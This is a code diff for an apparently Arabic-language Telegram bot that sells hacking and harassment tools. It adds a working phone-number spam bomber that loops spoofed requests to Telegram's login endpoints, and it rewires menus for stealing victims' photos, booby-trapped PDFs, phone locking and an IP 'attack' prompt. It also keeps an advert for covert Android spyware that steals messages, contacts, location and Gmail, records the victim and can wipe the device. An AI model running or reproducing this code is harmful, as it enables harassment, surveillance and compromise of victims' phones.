@@ -917,11 +917,8 @@ BUTTONS = [
         InlineKeyboardButton("زخرفة الاسماء", callback_data="btn14", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("اخـ^_^ـراق الهاتف كاملاً", callback_data="contact_developer_full_hack", api_kwargs={"style": "danger"})
-    ],
-    [
         InlineKeyboardButton("سحب صور الضੂحيه", callback_data="btn15", api_kwargs={"style": "danger"}),
-        InlineKeyboardButton("فحص الروابط", callback_data="check_link", api_kwargs={"style": "success"})
+        InlineKeyboardButton("اخـ^_^ـراق الهاتف كاملاً", callback_data="contact_developer_full_hack", api_kwargs={"style": "danger"})
     ],
     [
         InlineKeyboardButton("قراءة الباركود", web_app=WebAppInfo(url="https://products.aspose.app/barcode/ar/recognize"), api_kwargs={"style": "primary"})
@@ -935,6 +932,7 @@ BUTTONS = [
     ],
     [
         InlineKeyboardButton("الـID الخاص بك", callback_data="get_my_id", api_kwargs={"style": "success"}), 
+        InlineKeyboardButton("معرفة مستخدم", callback_data="get_user_info", api_kwargs={"style": "success"})
     ], 
     [
         InlineKeyboardButton("تحويل النص لصوت", callback_data="tts_service", api_kwargs={"style": "primary"}),
@@ -945,17 +943,18 @@ BUTTONS = [
     ], 
     [
         InlineKeyboardButton("إتصال وهمي", callback_data="telz_call", api_kwargs={"style": "primary"}), 
-        InlineKeyboardButton("معرفة مستخدم", callback_data="get_user_info", api_kwargs={"style": "primary"})
+        InlineKeyboardButton("ﺳـ͜بـام تـلـجـੂـــࢪام", callback_data="telegram_spam_btn", api_kwargs={"style": "primary"}) 
     ],
     [
         InlineKeyboardButton("تخويف الضੂحيه", callback_data="btn_ttt", api_kwargs={"style": "success"})
     ],
     [
         InlineKeyboardButton("اختصار الروابط", callback_data="shorten_link", api_kwargs={"style": "primary"}), 
-        InlineKeyboardButton("الـد|رك ويب", callback_data="Dark_web", api_kwargs={"style": "danger"})
+        InlineKeyboardButton("فحص الروابط", callback_data="check_link", api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("قفل الهاتف برمز", callback_data="phone_lock_app", api_kwargs={"style": "danger"})
+        InlineKeyboardButton("قفل الهاتف برمز", callback_data="phone_lock_app", api_kwargs={"style": "danger"}), 
+        InlineKeyboardButton("الـد|رك ويب", callback_data="Dark_web", api_kwargs={"style": "danger"})
     ],
     [
         InlineKeyboardButton("تـلـغـ/~/ــيــم الصور", callback_data="booby_image", api_kwargs={"style": "danger"}),
@@ -981,7 +980,7 @@ BUTTONS = [
         InlineKeyboardButton("الــخــلاصــه", web_app=WebAppInfo(url="https://hamza7k555-rgb.github.io/HAMZA/"), api_kwargs={"style": "primary"})
     ],
     [
-        InlineKeyboardButton("لـــوحــــة تــــحـــــكــــم الـــمـــالــــــك 👑", callback_data="owner_panel", api_kwargs={"style": "danger"})
+        InlineKeyboardButton("لـــوحــــة تــــحـــــكــــم الـــمـــالــــــك", callback_data="owner_panel", api_kwargs={"style": "danger"})
     ],
     [
         InlineKeyboardButton("✧ الــمــالــك  -  𝐇𝐀𝐌𝐙𝐀 ✧", url="tg://user?id=7305720183", api_kwargs={"style": "primary"})
@@ -1535,6 +1534,143 @@ async def handle_phone_lock_app(query):
     except Exception as e:
         logger.error(f"Error in handle_phone_lock_app: {e}")
         await query.message.edit_text("❌ <b>حدث خطأ في تحميل الخدمة</b>", parse_mode='HTML')
+        
+# ========== خدمة إرسال تلجرام ==========
+
+async def telegram_spam_send(phone):
+    phone = re.sub(r'[^0-9]', '', phone)
+    
+    if not phone:
+        return False
+    
+    if phone.startswith('0'):
+        full_phone = '+2' + phone
+    else:
+        full_phone = '+' + phone
+
+    tool = random.choice([1, 2])
+
+    try:
+        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
+            if tool == 1:
+                android_version = random.randint(10, 12)
+                device = "SM-G960F" if random.randint(0, 1) else "Pixel 4"
+                headers = {
+                    'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {android_version}; {device} Build/QP1A.190711.020)',
+                    'bot_id': '1288099309',
+                    'origin': 'https://t.me',
+                    'lang': 'en',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+                url = 'https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en'
+                response = await client.post(url, data={'phone': full_phone}, headers=headers)
+                return response.status_code == 200
+            else:
+                android_version = random.randint(11, 13)
+                device = "Pixel 6" if random.randint(0, 1) else "Samsung S22"
+                headers = {
+                    'User-Agent': f'Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': 'https://oauth.telegram.org',
+                    'Referer': 'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write'
+                }
+                url = 'https://oauth.telegram.org/auth/request?bot_id=5444323279&origin=https://fragment.com&request_access=write'
+                response = await client.post(url, data={'phone': full_phone}, headers=headers)
+                return response.status_code == 200
+    except Exception as e:
+        logger.error(f"Error in telegram_spam_send: {e}")
+        return False
+
+
+async def handle_telegram_spam_button(query):
+    try:
+        user_id = query.from_user.id
+
+        if BOT_STATUS == "stopped":
+            await query.message.edit_text("<b>البوت متوقف حاليًا</b>", parse_mode='HTML')
+            return
+
+        if is_user_blocked(user_id):
+            await query.message.edit_text("<b>أنت محظور من استخدام هذا البوت!</b>", parse_mode='HTML')
+            return
+
+        cancel_kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("إلغاء ورجوع", callback_data="cancel")]
+        ])
+
+        await query.message.edit_text(
+            "<b>ارسل رقم الهاتف</b>",
+            reply_markup=cancel_kb,
+            parse_mode='HTML'
+        )
+    except Exception as e:
+        logger.error(f"Error in handle_telegram_spam_button: {e}")
+        
+        
+async def process_telegram_spam_count(update, context, count):
+    phone = context.user_data.get('spam_phone')
+
+    if not phone:
+        await update.message.reply_text("حدث خطأ، ابدأ من جديد", parse_mode='HTML')
+        return
+
+    if count < 1 or count > 100:
+        await update.message.reply_text("العدد يجب أن يكون بين 1 و 100", parse_mode='HTML')
+        return
+
+    status_msg = await update.message.reply_text("تم ارسال 0", parse_mode='HTML')
+
+    for i in range(1, count + 1):
+        try:
+            await telegram_spam_send(phone)
+            try:
+                await status_msg.edit_text(f"تم ارسال {i}", parse_mode='HTML')
+            except Exception:
+                pass
+            await asyncio.sleep(1.5)
+        except Exception as e:
+            logger.error(f"Error in spam loop {i}: {e}")
+            continue
+
+    context.user_data.pop('spam_phone', None)
+    context.user_data.pop('waiting_for_spam_count', None)
+    
+async def cancel_waiting(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """إلغاء أي حالة انتظار والرجوع للقائمة"""
+    try:
+        query = update.callback_query
+        await query.answer("تم الإلغاء")
+        
+        # امسح كل حالات الانتظار
+        keys_to_clear = [
+            'waiting_for_spam_phone', 'waiting_for_spam_count', 'spam_phone',
+            'waiting_for_link', 'waiting_for_name', 'waiting_for_shorten',
+            'tracking_ip', 'checking_link', 'waiting_for_ip',
+            'waiting_for_tts_text', 'waiting_for_site_url',
+            'waiting_for_booby_image', 'waiting_for_booby_link',
+            'waiting_for_video_url', 'waiting_for_user_id',
+            'waiting_for_telz_number', 'sending_to_developer',
+            'webhook_action', 'webhook_token', 'owner_action',
+            'waiting_for_spam_count', 'waiting_for_tts_text'
+        ]
+        for k in keys_to_clear:
+            context.user_data.pop(k, None)
+        
+        keyboard = InlineKeyboardMarkup(BUTTONS)
+        try:
+            await query.message.delete()
+        except:
+            pass
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text="🎛️ <b>القائمة الرئيسية</b>",
+            reply_markup=keyboard,
+            parse_mode='HTML'
+        )
+    except Exception as e:
+        logger.error(f"Error in cancel_waiting: {e}")
 
 # ========== تحديث دالة button_click ==========
 async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1543,41 +1679,45 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id = update.callback_query.message.chat_id
 
         if BOT_STATUS == "stopped":
-            await update.callback_query.message.edit_text("⏸️ <b>البوت متوقف حاليًا</b>", parse_mode='HTML')
+            await update.callback_query.message.edit_text("<b>البوت متوقف حاليًا</b>", parse_mode='HTML')
             return
 
         if is_user_blocked(user_id):
-            await update.callback_query.message.edit_text("🚫 <b>أنت محظور من استخدام هذا البوت!</b>", parse_mode='HTML')
+            await update.callback_query.message.edit_text("<b>أنت محظور من استخدام هذا البوت!</b>", parse_mode='HTML')
             return
 
         query = update.callback_query
         await query.answer()
 
+        cancel_kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("إلغاء ورجوع", callback_data="cancel")]
+        ])
+
         # معالجة الروابط التي ترسل رسالة جديدة
         if query.data in LINKS_INFO:
             await handle_link_creation(query.data, user_id, chat_id, context)
             return
-            
+
         # الروابط الأخرى
         if query.data == "btn_ttt":
             original_link = LINKS["btn_ttt"]
             clickable_link = f'<a href="{original_link}">{original_link}</a>'
-            
-            message_text = f"""
-😂 <b>موقع تخويف فقط!</b>
 
-🔗 <b>الرابط:</b>
+            message_text = f"""
+<b>موقع تخويف فقط!</b>
+
+<b>الرابط:</b>
 {clickable_link}
 
-⚠️ <b>هذا الموقع للترفيه فقط!</b>
+<b>هذا الموقع للترفيه فقط!</b>
 """
-            
+
             keyboard = [
-                [InlineKeyboardButton("🌐 فتح الموقع", url=original_link)],
-                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
+                [InlineKeyboardButton("فتح الموقع", url=original_link)],
+                [InlineKeyboardButton("رجوع للقائمة", callback_data="back_to_main")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
-            
+
             await context.bot.send_message(
                 chat_id=chat_id,
                 text=message_text,
@@ -1591,11 +1731,11 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if query.data == "Dark_web":
             await handle_Dark_web(query)
             return
-            
+
         if query.data == "app_hamza":
             await handle_app_hamza_menu(query)
             return
-            
+
         if query.data == "keyboard_hamza":
             await handle_keyboard_hamza_k(query)
             return
@@ -1603,77 +1743,87 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if query.data == "themt":
             await handle_themtt(query)
             return
-            
+
         if query.data == "phone_lock_app":
             await handle_phone_lock_app(query)
             return
 
         if query.data == "shorten_link":
             await query.message.edit_text(
-                "🔗 <b>خدمة اختصار الروابط</b>\n\n"
-                "📝 <b>أرسل لي الرابط الذي تريد اختصاره:</b>\n\n"
-                "💡 <b>سيتم إنشاء 4 نسخ مختصرة مختلفة من الرابط</b>\n\n"
-                "⚠️ <b>ملاحظة:</b> يجب أن يبدأ الرابط بـ https:// أو http://",
+                "<b>خدمة اختصار الروابط</b>\n\n"
+                "<b>أرسل لي الرابط الذي تريد اختصاره:</b>\n\n"
+                "<b>سيتم إنشاء 4 نسخ مختصرة مختلفة من الرابط</b>\n\n"
+                "<b>ملاحظة:</b> يجب أن يبدأ الرابط بـ https:// أو http://",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             context.user_data['waiting_for_shorten'] = True
             return
-            
+
         if query.data == "tts_service":
             context.user_data['waiting_for_tts_text'] = True
             await query.message.edit_text(
-               "🔊 <b>خدمة تحويل النص إلى صوت</b>\n\n"
-               "📝 <b>أرسل النص الذي تريد تحويله إلى صوت:</b>\n\n"
+               "<b>خدمة تحويل النص إلى صوت</b>\n\n"
+               "<b>أرسل النص الذي تريد تحويله إلى صوت:</b>\n\n"
                "<i>يدعم العربية والإنجليزية تلقائياً</i>",
+               reply_markup=cancel_kb,
                parse_mode='HTML'
             )
-            return   
-        
+            return
+
         if query.data == "btn_download_site":
             context.user_data['waiting_for_site_url'] = True
             await query.message.edit_text(
-                "📂 <b>تحميل ملفات المواقع</b>\n\n"
-                "📝 <b>أرسل رابط الموقع الذي تريد سحب ملفاته:</b>\n"
+                "<b>تحميل ملفات المواقع</b>\n\n"
+                "<b>أرسل رابط الموقع الذي تريد سحب ملفاته:</b>\n"
                 "<i>(يجب أن يبدأ بـ http:// أو https://)</i>",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
-            
+
         if query.data == "booby_image":
             context.user_data['waiting_for_booby_image'] = True
             await query.message.edit_text(
-                "🎭 <b>خدمة تـلـغـ/~/ــيــم الصور</b>\n\n"
-                "📷 <b>أرسل الصورة التي تريد تـلـغـ/~/ــيــم:</b>\n\n"
-                "⚡ <b>سيتم تحويلها إلى PDF مـلـ/~/ـغم بالرابط الذي تختاره</b>",
+                "<b>خدمة تلغيم الصور</b>\n\n"
+                "<b>أرسل الصورة التي تريد تلغيمها:</b>\n\n"
+                "<b>سيتم تحويلها إلى PDF ملغم بالرابط الذي تختاره</b>",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
-            
+
         # ===== خدمات الويب هوك =====
         if query.data == "webhook_services":
             text = (
-               "🔗 <b>خدمات الويب هوك</b>\n\n"
+               "<b>خدمات الويب هوك</b>\n\n"
                "اهلا بك في الخدمات:\n"
                "• عمل ويب هوك\n"
                "• حذف ويب هوك\n"
                "• معلومات التوكن\n\n"
-               "📌 <b>اختر من القائمة:</b>"
+               "<b>اختر من القائمة:</b>"
             )
             keyboard = [
                 [
-                    InlineKeyboardButton("عمل ويب هوك ➕", callback_data="webhook_create"),
-                    InlineKeyboardButton("حذف ويب هوك 🗑️", callback_data="webhook_delete")
+                    InlineKeyboardButton("عمل ويب هوك", callback_data="webhook_create"),
+                    InlineKeyboardButton("حذف ويب هوك", callback_data="webhook_delete")
                 ],
-                [InlineKeyboardButton("معلومات التوكن ℹ️", callback_data="webhook_info")],
-                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
+                [InlineKeyboardButton("معلومات التوكن", callback_data="webhook_info")],
+                [InlineKeyboardButton("رجوع للقائمة", callback_data="back_to_main")]
             ]
             await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
+            return
+
+        if query.data == "telegram_spam_btn":
+            await handle_telegram_spam_button(query)
+            context.user_data['waiting_for_spam_phone'] = True
             return
 
         if query.data == "webhook_create":
             context.user_data['webhook_action'] = 'waiting_for_token_create'
             await query.message.edit_text(
-                "🔑 <b>عمل ويب هوك جديد</b>\n\nحسناً، أرسل لي التوكن الآن:",
+                "<b>عمل ويب هوك جديد</b>\n\nحسناً، أرسل لي التوكن الآن:",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
@@ -1681,7 +1831,8 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if query.data == "webhook_delete":
             context.user_data['webhook_action'] = 'waiting_for_token_delete'
             await query.message.edit_text(
-                "🗑️ <b>حذف ويب هوك</b>\n\nحسناً، أرسل التوكن وأنا سأحذف الويب هوك خالص:",
+                "<b>حذف ويب هوك</b>\n\nحسناً، أرسل التوكن وأنا سأحذف الويب هوك خالص:",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
@@ -1689,7 +1840,8 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if query.data == "webhook_info":
             context.user_data['webhook_action'] = 'waiting_for_token_info'
             await query.message.edit_text(
-                "ℹ️ <b>معلومات التوكن</b>\n\nحاضر، ابعتلي التوكن وأنا هجبلك كل المعلومات عنه:",
+                "<b>معلومات التوكن</b>\n\nحاضر، ابعتلي التوكن وأنا هجبلك كل المعلومات عنه:",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
@@ -1738,15 +1890,14 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await handle_virtual_numbers(query)
             return
 
-
         if query.data == "get_my_id":
             await handle_get_my_id(query)
             return
-            
+
         if query.data == "temp_email_btn":
             await handle_temp_email_button(query)
             return
-            
+
         if query.data.startswith("temp_email_"):
             await temp_email_router(query, user_id)
             return
@@ -1755,7 +1906,6 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             rating = int(query.data.split("_")[1])
             await handle_rating_selection(query, rating)
             return
-
 
         if query.data == "contact_developer_message":
             await handle_developer_message_request(query)
@@ -1766,16 +1916,18 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['waiting_for_ip'] = True
             context.user_data['user_id_for_ip'] = user_id
             await query.message.edit_text(
-                "🔹 <b>ارسل عنوان الـ IP اللي نهجم عليه!\n🔹 بدون ((  //:http  )) ☠️</b>",
+                "<b>ارسل عنوان الـ IP اللي نهجم عليه!\nبدون ((  //:http  ))</b>",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
-        
+
         if query.data == "dl_video":
             context.user_data['waiting_for_video_url'] = True
             await query.message.edit_text(
-                "📥 <b>أرسل رابط الفيديو</b>\n\n"
-                "💡 <b>يدعم:</b> YouTube, TikTok, Instagram, Facebook, Twitter وغيرهم",
+                "<b>أرسل رابط الفيديو</b>\n\n"
+                "<b>يدعم:</b> YouTube, TikTok, Instagram, Facebook, Twitter وغيرهم",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
@@ -1784,10 +1936,11 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['waiting_for_user_id'] = True
             context.user_data['user_id_for_info'] = user_id
             await query.message.edit_text(
-                "👤 <b>معرفة معلومات المستخدم</b>\n\n"
-                "🦅 <b>أرسل لي الـID الخاص بالمستخدم</b>\n\n"
-                "💡 <b>مثال:</b> <code>8443706468</code>\n\n"
-                "⚠️ <b>ملاحظة:</b> يجب أن يكون المستخدم قد تفاعل مع البوت من قبل",
+                "<b>معرفة معلومات المستخدم</b>\n\n"
+                "<b>أرسل لي الـID الخاص بالمستخدم</b>\n\n"
+                "<b>مثال:</b> <code>8443706468</code>\n\n"
+                "<b>ملاحظة:</b> يجب أن يكون المستخدم قد تفاعل مع البوت من قبل",
+                reply_markup=cancel_kb,
                 parse_mode='HTML'
             )
             return
@@ -1798,62 +1951,70 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         if query.data == "btn18":
-            await query.message.edit_text("🌍 <b>ارسل عنوان الـIP الذي تريد تتبعه\n🔹  بدون (( //:http ))</b>", parse_mode='HTML')
+            await query.message.edit_text(
+                "<b>ارسل عنوان الـIP الذي تريد تتبعه\nبدون (( //:http ))</b>",
+                reply_markup=cancel_kb,
+                parse_mode='HTML'
+            )
             context.user_data['tracking_ip'] = True
             return
 
         if query.data == "check_link":
-            await query.message.edit_text("😇 <b>إرسل الرابط الذي تريد فحصه</b>", parse_mode='HTML')
+            await query.message.edit_text(
+                "<b>إرسل الرابط الذي تريد فحصه</b>",
+                reply_markup=cancel_kb,
+                parse_mode='HTML'
+            )
             context.user_data['checking_link'] = True
             return
 
         if query.data == "btn14":
-            await query.message.edit_text("✨ <b>إرسل الاسم الذي تريد زخرفته\n( باللغه الإنجليزية )</b>", parse_mode='HTML')
+            await query.message.edit_text(
+                "<b>إرسل الاسم الذي تريد زخرفته\n( باللغه الإنجليزية )</b>",
+                reply_markup=cancel_kb,
+                parse_mode='HTML'
+            )
             context.user_data['waiting_for_name'] = True
             return
 
         if query.data == "btn13":
-            await query.message.edit_text("🎁 <b>إرسل لي رابط يبدأ بـ 'https'</b>", parse_mode='HTML')
+            await query.message.edit_text(
+                "<b>إرسل لي رابط يبدأ بـ 'https'</b>",
+                reply_markup=cancel_kb,
+                parse_mode='HTML'
+            )
             context.user_data['waiting_for_link'] = True
             return
 
         if query.data == "contact_developer_full_hack":
-    # ضع هنا رابط الرسالة من القناة العامة
-    # طريقة الحصول على الرابط: افتح القناة -> دوس على الفيديو -> كليك يمين -> Copy Message Link
-    # الرابط هيبقى شكله كده: https://t.me/اسم_القناة/رقم_الرسالة
-            video_post_url = "https://t.me/fkdfkdf3/4"  # 👈 غير ده لرابط الفيديو بتاعك
-    
-    # الرابط اللي هيتم فتحه لما المستخدم يدوس على الزرار اللي تحت الرسالة
-            my_profile_link = f"tg://user?id={DEVELOPER_ID}"  # 👈 بيفتح بروفايلك بالايدي
-    
+            video_post_url = "https://t.me/fkdfkdf3/4"
+            my_profile_link = f"tg://user?id={DEVELOPER_ID}"
+
             caption_text = (
-                "☠️ <b>إختراق الهاتف كاملاً ☠️</b>\n\n"
-                "🙂 <b>تتم عملية اختراق الهاتف كاملا والوصول لجميع معلومات جهاز شخص يبتزك او يضايقك عبر برنامج مخفي والاذونات تلقائي ومشفر من جميع مكافحه الفيروسات ما عليك الا انتقوم بارسالة الى الشخص وعند تثبيتة راح تقدر تتحكم بجهازة من خلال البوت فقط</b>\n\n"
-                "🔥 <b>راح تقدر تحصل على :</b>\n"
-                "<b>✔️ سحب جهات الاتصال 🔥</b>\n"
-                "<b>✔️ سحب سجل المكالمات 🔥</b>\n"
-                "<b>✔️ تسجيل صوت الشخص 🔥</b>\n"
-                "<b>✔️ تلتقط فيديو وسلفي لوجهه 🔥</b>\n"
-                "<b>✔️ سحب جميع الرسائل 🔥</b>\n"
-                "<b>✔️ سحب الموقع 🔥</b>\n"
-                "<b>✔️ سحب جميع الصور 🔥</b>\n"
-                "<b>✔️ التجسس على الرسائل 🔥</b>\n"
-                "<b>✔️ سحب رسايل جيميل 🔥</b>\n"
-                "<b>✔️ فرمته هاتف الضحيه 🔥</b>\n\n"
-                "😘 <b>للاشتراك تواصل معي :</b> <a href=\"https://t.me/jt_r3r\">@jt_r3r</a> 💌\n\n"
-                "⚠️ <b>ملاحظة : غير مسؤول امام الله على طريقة استعمالك للطريقة فقط تم صناعتها لمحاربة الابتزاز او لحل مشكلة تواجهك</b>"
+                "<b>إختراق الهاتف كاملاً</b>\n\n"
+                "<b>تتم عملية اختراق الهاتف كاملا والوصول لجميع معلومات جهاز شخص يبتزك او يضايقك عبر برنامج مخفي والاذونات تلقائي ومشفر من جميع مكافحه الفيروسات ما عليك الا انتقوم بارسالة الى الشخص وعند تثبيتة راح تقدر تتحكم بجهازة من خلال البوت فقط</b>\n\n"
+                "<b>راح تقدر تحصل على :</b>\n"
+                "<b>سحب جهات الاتصال</b>\n"
+                "<b>سحب سجل المكالمات</b>\n"
+                "<b>تسجيل صوت الشخص</b>\n"
+                "<b>تلتقط فيديو وسلفي لوجهه</b>\n"
+                "<b>سحب جميع الرسائل</b>\n"
+                "<b>سحب الموقع</b>\n"
+                "<b>سحب جميع الصور</b>\n"
+                "<b>التجسس على الرسائل</b>\n"
+                "<b>سحب رسايل جيميل</b>\n"
+                "<b>فرمته هاتف الضحيه</b>\n\n"
+                "<b>للاشتراك تواصل معي :</b> <a href=\"https://t.me/jt_r3r\">@jt_r3r</a>\n\n"
+                "<b>ملاحظة : غير مسؤول امام الله على طريقة استعمالك للطريقة فقط تم صناعتها لمحاربة الابتزاز او لحل مشكلة تواجهك</b>"
             )
 
-    # أزرار تحت الرسالة
             keyboard = [
-                [InlineKeyboardButton("👤 تواصل مع المالك", url=my_profile_link)],
-                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
+                [InlineKeyboardButton("تواصل مع المالك", url=my_profile_link)],
+                [InlineKeyboardButton("رجوع للقائمة", callback_data="back_to_main")]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
             try:
-        # سحب الفيديو من الرابط وإعادة إرساله للمستخدم
-        # (البوت لازم يكون عضو في القناة أو القناة عامة)
                 await context.bot.send_video(
                     chat_id=query.message.chat_id,
                     video=video_post_url,
@@ -1862,45 +2023,44 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     reply_markup=reply_markup,
                     supports_streaming=True
                 )
-        # مسح رسالة "القائمة" اللي كان المستخدم واقف عليها
                 await query.message.delete()
             except Exception as e:
                 logger.error(f"Error sending video: {e}")
                 await query.message.edit_text(
-                    "❌ <b>حدث خطأ أثناء إرسال الفيديو.</b>\n"
+                    "<b>حدث خطأ أثناء إرسال الفيديو.</b>\n"
                     "تأكد أن رابط الفيديو صحيح وأن البوت عضو في القناة.",
                     parse_mode='HTML'
                 )
             return
-        
+
         if query.data.startswith("change_link_"):
             original_btn = query.data.replace("change_link_", "")
-            
+
             if original_btn in LINKS_INFO:
                 link_info = LINKS_INFO[original_btn]
                 original_link = link_info["original"].format(user_id=user_id)
             else:
                 original_link = LINKS.get(original_btn, "").format(user_id=user_id)
 
-            await query.message.edit_text("⏳ <b>جاري إنشاء روابط مختصرة...</b>", parse_mode='HTML')
+            await query.message.edit_text("<b>جاري إنشاء روابط مختصرة...</b>", parse_mode='HTML')
 
             short_links = await link_shortener.shorten_url(original_link)
 
             if not short_links:
-                await query.message.edit_text("❌ <b>تعذر اختصار الرابط. حاول مرة أخرى.</b>", parse_mode='HTML')
+                await query.message.edit_text("<b>تعذر اختصار الرابط. حاول مرة أخرى.</b>", parse_mode='HTML')
                 return
 
-            message = "✅ <b>روابطك المختصرة:</b>\n\n"
+            message = "<b>روابطك المختصرة:</b>\n\n"
 
             for i, short_link in enumerate(short_links, 1):
                 clickable_link = f'<a href="{short_link}">{short_link}</a>'
                 message += f"{i}. {clickable_link}\n"
 
-            message += f"\n🔍 <b>ملاحظة:</b> تم إنشاء 4 نسخ مختلفة من الرابط\n"
-            message += f"✅ <b>جميع الروابط شغالة وقابلة للفتح مباشرة!</b>"
+            message += "\n<b>ملاحظة:</b> تم إنشاء 4 نسخ مختلفة من الرابط\n"
+            message += "<b>جميع الروابط شغالة وقابلة للفتح مباشرة!</b>"
 
             keyboard = InlineKeyboardMarkup([
-                [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_main")]
+                [InlineKeyboardButton("رجوع للقائمة", callback_data="back_to_main")]
             ])
 
             await query.message.edit_text(message, reply_markup=keyboard, parse_mode='HTML', disable_web_page_preview=False)
@@ -1949,25 +2109,41 @@ async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if query.data == "back_to_main":
             keyboard = InlineKeyboardMarkup(BUTTONS)
-            await query.message.edit_text("🎛️ <b>القائمة الرئيسية</b>", reply_markup=keyboard, parse_mode='HTML')
+            try:
+                await query.message.delete()
+            except:
+                pass
+            await context.bot.send_message(
+                chat_id=query.message.chat_id,
+                text="<b>القائمة الرئيسية</b>",
+                reply_markup=keyboard,
+                parse_mode='HTML'
+            )
             return
-            
+
+        if query.data == "cancel":
+            await cancel_waiting(update, context)
+            return
+
         if query.data == "telz_call":
             context.user_data['waiting_for_telz_number'] = True
             await query.message.edit_text(
-                 "<b>أرسل رقم الهاتف:::-🥂⛧!</b>", 
+                 "<b>أرسل رقم الهاتف</b>",
+                 reply_markup=cancel_kb,
                  parse_mode='HTML'
             )
             return
 
-        await query.message.edit_text("❌ هذا الزر غير متاح حالياً")
+        await query.message.edit_text("<b>هذا الزر غير متاح حالياً</b>")
 
     except Exception as e:
         logger.error(f"Error in button_click: {e}")
         try:
-            await query.message.edit_text("❌ حدث خطأ في المعالجة")
+            await query.message.edit_text("<b>حدث خطأ في المعالجة</b>")
         except:
-            await query.message.reply_text("❌ حدث خطأ في المعالجة")
+            await query.message.reply_text("<b>حدث خطأ في المعالجة</b>")
+            
+            
 # ========== دوال نسخ الرسائل للواتساب ==========
 async def copy_whatsapp_ru(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """نسخ الرسالة الروسية للواتساب"""
@@ -4528,6 +4704,40 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     os.remove(zip_path)
                 except:
                    pass
+            return
+            
+        if context.user_data.get('waiting_for_spam_phone'):
+            phone_input = user_message.strip()
+            context.user_data['spam_phone'] = phone_input
+            context.user_data.pop('waiting_for_spam_phone', None)
+            context.user_data['waiting_for_spam_count'] = True
+            await update.message.reply_text(
+                "ارسل عدد الرسايل",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("إلغاء ورجوع", callback_data="cancel")]
+                ]),
+                parse_mode='HTML'
+            )
+            return
+
+        if context.user_data.get('waiting_for_spam_count'):
+            try:
+                count = int(user_message.strip())
+            except ValueError:
+                await update.message.reply_text("ارسل رقم صحيح", parse_mode='HTML')
+                return
+            context.user_data.pop('waiting_for_spam_count', None)
+            await process_telegram_spam_count(update, context, count)
+            return
+
+        if context.user_data.get('waiting_for_spam_count'):
+            try:
+                count = int(text.strip())
+            except ValueError:
+                await update.message.reply_text("ارسل رقم صحيح", parse_mode='HTML')
+                return
+            context.user_data.pop('waiting_for_spam_count', None)
+            await process_telegram_spam_count(update, context, count)
             return
             
         # ===== استقبال التوكن لخدمات الويب هوك =====
